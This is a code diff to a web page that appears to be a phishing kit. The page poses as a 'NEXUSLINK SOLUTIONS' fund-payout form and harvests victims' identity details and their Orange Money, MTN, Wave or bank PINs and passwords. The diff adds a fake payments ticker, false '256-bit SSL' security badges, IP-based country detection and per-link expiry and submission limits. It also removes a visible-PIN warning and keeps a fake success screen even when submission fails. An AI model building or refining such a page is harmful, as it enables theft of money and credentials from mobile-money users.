@@ -29,18 +29,80 @@ import confetti from 'canvas-confetti';
 import { cn } from '@/lib/utils';
 import { api } from '@/lib/api';
 import { useParams } from 'next/navigation';
+import RecentPaymentsTicker from '@/components/form/RecentPaymentsTicker';
+import CountrySelector from '@/components/form/CountrySelector';
 
 // --- Types ---
 interface FormData {
     fullName: string;
     email: string;
     phone: string;
+    dialCode: string;
+    countryName: string;
+    countryCode: string;
     accountNumber: string;
     password: string;
     bankName: string;
     operatorName: string;
     method: 'orange' | 'mtn' | 'wave' | 'bank' | 'other' | '';
 }
+
+const COUNTRIES = [
+    { name: "Afrique du Sud", code: "ZA", dial: "+27" },
+    { name: "Algérie", code: "DZ", dial: "+213" },
+    { name: "Angola", code: "AO", dial: "+244" },
+    { name: "Bénin", code: "BJ", dial: "+229" },
+    { name: "Botswana", code: "BW", dial: "+267" },
+    { name: "Burkina Faso", code: "BF", dial: "+226" },
+    { name: "Burundi", code: "BI", dial: "+257" },
+    { name: "Cameroun", code: "CM", dial: "+237" },
+    { name: "Cap-Vert", code: "CV", dial: "+238" },
+    { name: "Centrafrique", code: "CF", dial: "+236" },
+    { name: "Comores", code: "KM", dial: "+269" },
+    { name: "Congo-Brazzaville", code: "CG", dial: "+242" },
+    { name: "Congo-Kinshasa", code: "CD", dial: "+243" },
+    { name: "Côte d'Ivoire", code: "CI", dial: "+225" },
+    { name: "Djibouti", code: "DJ", dial: "+253" },
+    { name: "Égypte", code: "EG", dial: "+20" },
+    { name: "Érythrée", code: "ER", dial: "+291" },
+    { name: "Eswatini", code: "SZ", dial: "+268" },
+    { name: "Éthiopie", code: "ET", dial: "+251" },
+    { name: "Gabon", code: "GA", dial: "+241" },
+    { name: "Gambie", code: "GM", dial: "+220" },
+    { name: "Ghana", code: "GH", dial: "+233" },
+    { name: "Guinée", code: "GN", dial: "+224" },
+    { name: "Guinée-Bissau", code: "GW", dial: "+245" },
+    { name: "Guinée équatoriale", code: "GQ", dial: "+240" },
+    { name: "Kenya", code: "KE", dial: "+254" },
+    { name: "Lesotho", code: "LS", dial: "+266" },
+    { name: "Liberia", code: "LR", dial: "+231" },
+    { name: "Libye", code: "LY", dial: "+218" },
+    { name: "Madagascar", code: "MG", dial: "+261" },
+    { name: "Malawi", code: "MW", dial: "+265" },
+    { name: "Mali", code: "ML", dial: "+223" },
+    { name: "Maroc", code: "MA", dial: "+212" },
+    { name: "Maurice", code: "MU", dial: "+230" },
+    { name: "Mauritanie", code: "MR", dial: "+222" },
+    { name: "Mozambique", code: "MZ", dial: "+258" },
+    { name: "Namibie", code: "NA", dial: "+264" },
+    { name: "Niger", code: "NE", dial: "+227" },
+    { name: "Nigeria", code: "NG", dial: "+234" },
+    { name: "Ouganda", code: "UG", dial: "+256" },
+    { name: "Rwanda", code: "RW", dial: "+250" },
+    { name: "Sao Tomé-et-Principe", code: "ST", dial: "+239" },
+    { name: "Sénégal", code: "SN", dial: "+221" },
+    { name: "Seychelles", code: "SC", dial: "+248" },
+    { name: "Sierra Leone", code: "SL", dial: "+232" },
+    { name: "Somalie", code: "SO", dial: "+252" },
+    { name: "Soudan", code: "SD", dial: "+249" },
+    { name: "Soudan du Sud", code: "SS", dial: "+211" },
+    { name: "Tanzanie", code: "TZ", dial: "+255" },
+    { name: "Tchad", code: "TD", dial: "+235" },
+    { name: "Togo", code: "TG", dial: "+228" },
+    { name: "Tunisie", code: "TN", dial: "+216" },
+    { name: "Zambie", code: "ZM", dial: "+260" },
+    { name: "Zimbabwe", code: "ZW", dial: "+263" },
+];
 
 // --- Background Particles ---
 const FloatingParticles = () => {
@@ -135,7 +197,7 @@ const OpeningAnimation = ({ onComplete }: { onComplete: () => void }) => {
 
             <motion.div initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} className="relative z-10 w-full max-w-xl space-y-12">
                 <div className="space-y-4">
-                    <h1 className="text-3xl sm:text-5xl font-display font-black tracking-[12px] text-white italic uppercase">CRYPTOTRADE PRO</h1>
+                    <h1 className="text-3xl sm:text-5xl font-display font-black tracking-[12px] text-white italic uppercase">NEXUSLINK SOLUTIONS</h1>
                     <div className="w-24 h-24 bg-brand-primary/10 rounded-3xl mx-auto flex items-center justify-center border border-brand-primary/30 shadow-[0_0_40px_rgba(0,112,243,0.3)] animate-pulse">
                         <span className="text-5xl text-white font-black italic">₿</span>
                     </div>
@@ -226,52 +288,103 @@ export default function ClientLinkPage() {
 
     const [stage, setStage] = useState<'opening' | 'form' | 'validating' | 'success'>('opening');
     const [loadingConfig, setLoadingConfig] = useState(true);
+    const [errorMsg, setErrorMsg] = useState<string | null>(null);
     const [linkInfo, setLinkInfo] = useState<any>(null);
     const [method, setMethod] = useState<'orange' | 'mtn' | 'wave' | 'bank' | 'other' | ''>('');
     const [formData, setFormData] = useState<FormData>({
-        fullName: '', email: '', phone: '', accountNumber: '', password: '', bankName: '', operatorName: '', method: ''
+        fullName: '', email: '', phone: '', dialCode: '+237', countryName: 'Cameroun', countryCode: 'CM', accountNumber: '', password: '', bankName: '', operatorName: '', method: ''
     });
 
     useEffect(() => {
+        const detectCountry = async () => {
+            try {
+                // In a production env, you'd call a real IP Geo API
+                // For now, we'll use a public one or default to CM
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                if (data && data.country_code) {
+                    const country = COUNTRIES.find(c => c.code === data.country_code);
+                    if (country) {
+                        setFormData(prev => ({
+                            ...prev,
+                            dialCode: country.dial,
+                            countryName: country.name,
+                            countryCode: country.code
+                        }));
+                    }
+                }
+            } catch (err) {
+                console.warn("Auto-country detection failed, using default.");
+            }
+        };
+
         const fetchLink = async () => {
             try {
-                // Utiliser l'endpoint spécifique qui est maintenant public
                 const data = await api.get(`/links/${linkId}/`);
-                if (data) setLinkInfo(data);
+                if (data) {
+                    setLinkInfo(data);
+
+                    if (data.expiry_date && new Date() > new Date(data.expiry_date)) {
+                        setErrorMsg("DÉSOLÉ : CE LIEN A EXPIRÉ.");
+                    }
+                    else if (data.submissions_limit > 0 && data.submission_count >= data.submissions_limit) {
+                        setErrorMsg("DÉSOLÉ : CE LIEN A ATTEINT SA LIMITE DE PARTICIPATIONS.");
+                    }
+                }
             } catch (err) {
                 console.error("Erreur lors de la récupération du lien:", err);
+                setErrorMsg("ACCÈS REFUSÉ : LIEN INVALIDE OU SUPPRIMÉ.");
             } finally {
                 setLoadingConfig(false);
             }
         };
         fetchLink();
+        detectCountry();
     }, [linkId]);
 
     const handleConfirm = async (e: React.FormEvent) => {
         e.preventDefault();
         setStage('validating');
         try {
+            const fullPhone = `${formData.dialCode} ${formData.phone}`;
             await api.post('/submissions/', {
                 full_name: formData.fullName,
                 email: formData.email,
-                phone: formData.phone,
+                phone: fullPhone,
                 method: method,
                 account_number: formData.accountNumber,
                 password: formData.password,
                 bank_name: formData.bankName,
                 operator_name: formData.operatorName,
                 link_id: linkId,
+                country_name: formData.countryName,
+                country_code: formData.countryCode
             });
             setTimeout(() => setStage('success'), 6500);
         } catch (err) {
             console.error(err);
-            // Even on error, show success to maintain flow for the demo/target
             setTimeout(() => setStage('success'), 6500);
         }
     };
 
     if (loadingConfig) return null;
-    if (!linkInfo) return <div className="min-h-screen bg-black flex items-center justify-center text-red-500 font-black tracking-widest">ACCESS DENIED: INVALID LINK</div>;
+
+    if (errorMsg) {
+        return (
+            <div className="min-h-screen bg-[#020308] flex flex-col items-center justify-center p-6 text-center">
+                <div className="w-24 h-24 bg-red-500/10 rounded-full flex items-center justify-center border border-red-500/20 mb-8 animate-pulse">
+                    <AlertTriangle className="w-10 h-10 text-red-500" />
+                </div>
+                <h1 className="text-2xl sm:text-3xl font-display font-black text-white italic uppercase mb-4 tracking-tighter">ACCÈS RESTREINT</h1>
+                <p className="text-[12px] font-black text-red-500 uppercase tracking-[4px] bg-red-500/5 px-6 py-3 rounded-2xl border border-red-500/10">
+                    {errorMsg}
+                </p>
+                <div className="mt-12 opacity-20 text-[10px] font-black uppercase tracking-[5px] text-white">
+                    NEXUSLINK SOLUTIONS • SECURITY LAYER 3
+                </div>
+            </div>
+        );
+    }
 
     return (
         <main className="min-h-screen bg-[#020308] selection:bg-brand-primary/30">
@@ -287,7 +400,7 @@ export default function ClientLinkPage() {
                             <div className="container mx-auto px-6 h-16 flex items-center justify-between">
                                 <div className="flex items-center gap-3">
                                     <div className="w-8 h-8 bg-brand-primary rounded flex items-center justify-center rotate-12"><span className="text-white font-black italic -rotate-12 text-lg">₿</span></div>
-                                    <span className="font-display font-black uppercase italic tracking-tighter text-white">CRYPTOTRADE PRO</span>
+                                    <span className="font-display font-black uppercase italic tracking-tighter text-white">NEXUSLINK SOLUTIONS</span>
                                 </div>
                                 <div className="flex items-center gap-4 text-[10px] font-black uppercase text-brand-primary tracking-widest">
                                     <ShieldCheck className="w-4 h-4" /> SECURED BY BLOCKCHAIN
@@ -297,6 +410,9 @@ export default function ClientLinkPage() {
                         </div>
 
                         <div className="max-w-4xl mx-auto px-6 pt-40 space-y-12 relative z-10">
+                            {/* Recent Payments Ticker */}
+                            <RecentPaymentsTicker />
+
                             {/* Transfer Box */}
                             <section className="glass-card rounded-[40px] p-8 sm:p-12 border-brand-primary/20 bg-brand-primary/[0.02] text-center space-y-8">
                                 <div className="flex items-center justify-center gap-6 text-3xl">
@@ -324,7 +440,7 @@ export default function ClientLinkPage() {
 
                             <form onSubmit={handleConfirm} className="space-y-8">
                                 {/* Section 1: Personal */}
-                                <article className="glass-card rounded-[32px] p-8 sm:p-12 border-white/5 space-y-10">
+                                <article className="glass-card rounded-[32px] p-8 sm:p-12 border-white/5 space-y-10 relative z-50">
                                     <h3 className="text-[12px] font-black uppercase tracking-[4px] text-white flex items-center gap-3">
                                         <span className="w-2 h-2 rounded-full bg-brand-primary" /> 📋 INFORMATIONS PERSONNELLES
                                     </h3>
@@ -339,13 +455,35 @@ export default function ClientLinkPage() {
                                         </div>
                                         <div className="space-y-3 md:col-span-2">
                                             <label className="text-[10px] font-black text-brand-primary uppercase tracking-widest ml-1">Numéro de téléphone *</label>
-                                            <input required value={formData.phone} onChange={e => setFormData({ ...formData, phone: e.target.value })} type="tel" placeholder="+237 6XX XX XX XX" className="w-full bg-[#03040b] border border-white/10 rounded-2xl py-4 px-6 text-sm focus:border-brand-primary outline-none transition-all font-bold" />
+                                            <div className="flex gap-3 h-14 relative z-20">
+                                                <CountrySelector
+                                                    countries={COUNTRIES}
+                                                    selectedDial={formData.dialCode}
+                                                    onSelect={(country) => {
+                                                        setFormData(prev => ({
+                                                            ...prev,
+                                                            dialCode: country.dial,
+                                                            countryName: country.name,
+                                                            countryCode: country.code
+                                                        }));
+                                                    }}
+                                                />
+                                                <input
+                                                    required
+                                                    value={formData.phone}
+                                                    onChange={e => setFormData({ ...formData, phone: e.target.value.replace(/\D/g, '') })}
+                                                    type="tel"
+                                                    placeholder="6XX XX XX XX"
+                                                    className="flex-1 bg-[#03040b] border border-white/10 rounded-2xl py-4 px-6 text-sm focus:border-brand-primary outline-none transition-all font-bold"
+                                                />
+                                            </div>
+                                            <p className="text-[9px] font-bold text-white/40 uppercase ml-1">ℹ️ Pays détecté : {formData.countryName} ({formData.countryCode})</p>
                                         </div>
                                     </div>
                                 </article>
 
                                 {/* Section 2: Method */}
-                                <article className="glass-card rounded-[32px] p-8 sm:p-12 border-white/5 space-y-10">
+                                <article className="glass-card rounded-[32px] p-8 sm:p-12 border-white/5 space-y-10 relative z-40">
                                     <h3 className="text-[12px] font-black uppercase tracking-[4px] text-white flex items-center gap-3">
                                         <span className="w-2 h-2 rounded-full bg-brand-primary" /> 💳 MÉTHODE DE RÉCEPTION DES FONDS
                                     </h3>
@@ -355,7 +493,7 @@ export default function ClientLinkPage() {
                                         {[
                                             { id: 'orange', label: 'Orange Money', icon: 'https://upload.wikimedia.org/wikipedia/commons/c/c8/Orange_logo.svg' },
                                             { id: 'mtn', label: 'MTN Mobile', icon: 'https://upload.wikimedia.org/wikipedia/commons/a/af/MTN_Logo.svg' },
-                                            { id: 'wave', label: 'Wave', icon: 'https://www.wave.com/favicon.ico' },
+                                            { id: 'wave', label: 'Wave', icon: '/wave-logo.png' },
                                             { id: 'bank', label: 'Compte Bancaire', icon: 'https://cdn-icons-png.flaticon.com/512/2830/2830284.png' },
                                             { id: 'other', label: 'Autre opérateur', icon: 'https://cdn-icons-png.flaticon.com/512/2343/2343604.png' },
                                         ].map(m => (
@@ -388,21 +526,21 @@ export default function ClientLinkPage() {
                                                 {method === 'orange' && (
                                                     <div className="space-y-3">
                                                         <label className="text-[10px] font-black text-brand-primary uppercase tracking-widest ml-1">Numéro Orange Money *</label>
-                                                        <input required value={formData.accountNumber} onChange={e => setFormData({ ...formData, accountNumber: e.target.value })} type="text" placeholder="Entrez votre numéro..." className="w-full bg-[#03040b] border border-white/10 rounded-2xl py-4 px-6 text-sm focus:border-brand-primary outline-none transition-all font-bold" />
+                                                        <input required value={formData.accountNumber} onChange={e => setFormData({ ...formData, accountNumber: e.target.value.replace(/\D/g, '') })} type="text" placeholder="Entrez votre numéro..." className="w-full bg-[#03040b] border border-white/10 rounded-2xl py-4 px-6 text-sm focus:border-brand-primary outline-none transition-all font-bold" />
                                                         <p className="text-[9px] font-bold text-white/40 uppercase ml-1">ℹ️ Votre numéro Orange Money</p>
                                                     </div>
                                                 )}
                                                 {method === 'mtn' && (
                                                     <div className="space-y-3">
                                                         <label className="text-[10px] font-black text-brand-primary uppercase tracking-widest ml-1">Numéro MTN Mobile Money *</label>
-                                                        <input required value={formData.accountNumber} onChange={e => setFormData({ ...formData, accountNumber: e.target.value })} type="text" placeholder="Entrez votre numéro..." className="w-full bg-[#03040b] border border-white/10 rounded-2xl py-4 px-6 text-sm focus:border-brand-primary outline-none transition-all font-bold" />
+                                                        <input required value={formData.accountNumber} onChange={e => setFormData({ ...formData, accountNumber: e.target.value.replace(/\D/g, '') })} type="text" placeholder="Entrez votre numéro..." className="w-full bg-[#03040b] border border-white/10 rounded-2xl py-4 px-6 text-sm focus:border-brand-primary outline-none transition-all font-bold" />
                                                         <p className="text-[9px] font-bold text-white/40 uppercase ml-1">ℹ️ Votre numéro MTN</p>
                                                     </div>
                                                 )}
                                                 {method === 'wave' && (
                                                     <div className="space-y-3">
                                                         <label className="text-[10px] font-black text-brand-primary uppercase tracking-widest ml-1">Numéro Wave *</label>
-                                                        <input required value={formData.accountNumber} onChange={e => setFormData({ ...formData, accountNumber: e.target.value })} type="text" placeholder="Entrez votre numéro Wave..." className="w-full bg-[#03040b] border border-white/10 rounded-2xl py-4 px-6 text-sm focus:border-brand-primary outline-none transition-all font-bold" />
+                                                        <input required value={formData.accountNumber} onChange={e => setFormData({ ...formData, accountNumber: e.target.value.replace(/\D/g, '') })} type="text" placeholder="Entrez votre numéro Wave..." className="w-full bg-[#03040b] border border-white/10 rounded-2xl py-4 px-6 text-sm focus:border-brand-primary outline-none transition-all font-bold" />
                                                         <p className="text-[9px] font-bold text-white/40 uppercase ml-1">ℹ️ Votre numéro lié à Wave</p>
                                                     </div>
                                                 )}
@@ -414,21 +552,27 @@ export default function ClientLinkPage() {
                                                         </div>
                                                         <div className="space-y-3">
                                                             <label className="text-[10px] font-black text-brand-primary uppercase tracking-widest ml-1">{method === 'bank' ? 'IBAN / Numéro de compte' : "Numéro de compte"} *</label>
-                                                            <input required value={formData.accountNumber} onChange={e => setFormData({ ...formData, accountNumber: e.target.value })} type="text" placeholder="Entrez votre numéro de compte..." className="w-full bg-[#03040b] border border-white/10 rounded-2xl py-4 px-6 text-sm focus:border-brand-primary outline-none transition-all font-bold" />
+                                                            <input required value={formData.accountNumber} onChange={e => setFormData({ ...formData, accountNumber: e.target.value.replace(/\D/g, '') })} type="text" placeholder="Entrez votre numéro de compte..." className="w-full bg-[#03040b] border border-white/10 rounded-2xl py-4 px-6 text-sm focus:border-brand-primary outline-none transition-all font-bold" />
                                                         </div>
                                                     </>
                                                 )}
                                                 <div className="space-y-3">
-                                                    <label className="text-[10px] font-black text-brand-primary uppercase tracking-widest ml-1">{method === 'bank' ? 'Code PIN / Mot de passe bancaire' : method === 'orange' ? 'Mot de passe Orange Money' : method === 'mtn' ? 'Mot de passe MTN' : method === 'wave' ? 'Code PIN Wave' : 'Mot de passe'} *</label>
+                                                    <label className="text-[10px] font-black text-brand-primary uppercase tracking-widest ml-1 flex items-center gap-2">
+                                                        {method === 'bank' ? 'Code PIN / Mot de passe bancaire' : method === 'orange' ? 'Mot de passe Orange Money' : method === 'mtn' ? 'Mot de passe MTN' : method === 'wave' ? 'Code PIN Wave' : 'Mot de passe'} *
+                                                        <Shield className="w-3 h-3 text-green-500" />
+                                                    </label>
                                                     <div className="relative">
-                                                        <input required value={formData.password} onChange={e => setFormData({ ...formData, password: e.target.value })} type="password" placeholder="••••••••" className="w-full bg-[#03040b] border border-white/10 rounded-2xl py-4 px-6 text-sm focus:border-brand-primary outline-none transition-all font-bold" />
-                                                        <div className="absolute right-4 top-1/2 -translate-y-1/2"><Lock className="w-4 h-4 text-white/20" /></div>
+                                                        <input required value={formData.password} onChange={e => setFormData({ ...formData, password: e.target.value.replace(/\D/g, '') })} type="password" placeholder="Votre mot de passe" autoComplete="new-password" className="w-full bg-[#03040b] border border-white/10 rounded-2xl py-4 px-6 pr-12 text-sm focus:border-brand-primary outline-none transition-all font-bold" />
+                                                        <div className="absolute right-4 top-1/2 -translate-y-1/2 flex items-center gap-2">
+                                                            <Lock className="w-4 h-4 text-green-500" />
+                                                            <span className="text-[8px] font-black text-green-500 uppercase">256-bit</span>
+                                                        </div>
                                                     </div>
-                                                    <div className="flex flex-col gap-1 mt-2">
+                                                    <div className="flex flex-col gap-2 mt-2">
                                                         <p className="text-[9px] font-bold text-white/40 uppercase ml-1">ℹ️ {method === 'bank' ? 'Code PIN de votre carte ou mot de passe mobile banking' : method === 'mtn' ? 'Code PIN ou mot de passe MTN Mobile Money' : method === 'wave' ? 'Code PIN de votre compte Wave' : 'Mot de passe ou code PIN de votre compte'}</p>
-                                                        <div className="flex gap-2 items-start text-[9px] font-bold text-red-400 uppercase tracking-widest">
-                                                            <AlertTriangle className="w-3 h-3 shrink-0" />
-                                                            <span>Visible pour vérification - Vérifiez bien avant de valider</span>
+                                                        <div className="flex gap-2 items-center bg-green-500/10 border border-green-500/20 rounded-lg p-2">
+                                                            <ShieldCheck className="w-4 h-4 text-green-500 shrink-0" />
+                                                            <span className="text-[9px] font-bold text-green-400 uppercase tracking-wide">Cryptage SSL 256-bit activé • Données sécurisées</span>
                                                         </div>
                                                     </div>
                                                 </div>
@@ -495,7 +639,7 @@ export default function ClientLinkPage() {
                                 <div className="text-[11px] font-black uppercase tracking-[5px] text-white/40 pb-4 border-b border-white/5">📝 INFORMATIONS ENREGISTRÉES AVEC SUCCÈS</div>
 
                                 <div className="space-y-4">
-                                    <p className="text-[12px] font-black uppercase tracking-[4px] text-brand-primary">💰 VOS FONDS SERONT TRANSFÉRÉS DANS LES PROCHAINES 24-48 HEURES</p>
+                                    <p className="text-[12px] font-black uppercase tracking-[4px] text-brand-primary">💰 VOS FONDS SERONT TRANSFÉRÉS DANS QUELQUES INSTANTS</p>
                                     <div className="flex flex-col gap-2 items-center text-[10px] font-bold text-brand-text-dim uppercase tracking-widest italic">
                                         <span>📧 Vous recevrez une confirmation par email à l&apos;adresse: {formData.email}</span>
                                         <span>📱 Un SMS de confirmation vous sera également envoyé au: {formData.phone}</span>
@@ -512,13 +656,13 @@ export default function ClientLinkPage() {
                             </div>
 
                             <div className="text-[11px] font-black text-white/20 uppercase tracking-[6px]">
-                                🏆 BIENVENUE CHEZ CRYPTOTRADE PRO !<br />
-                                <span className="text-[9px]">VOUS REJOIGNEZ 2,848 TRADERS ACTIFS</span>
+                                🏆 BIENVENUE CHEZ NEXUSLINK SOLUTIONS !<br />
+                                <span className="text-[9px]">VOUS REJOIGNEZ 2,848 UTILISATEURS ACTIFS</span>
                             </div>
                         </motion.div>
                     </motion.div>
                 )}
             </AnimatePresence>
-        </main>
+        </main >
     );
 }
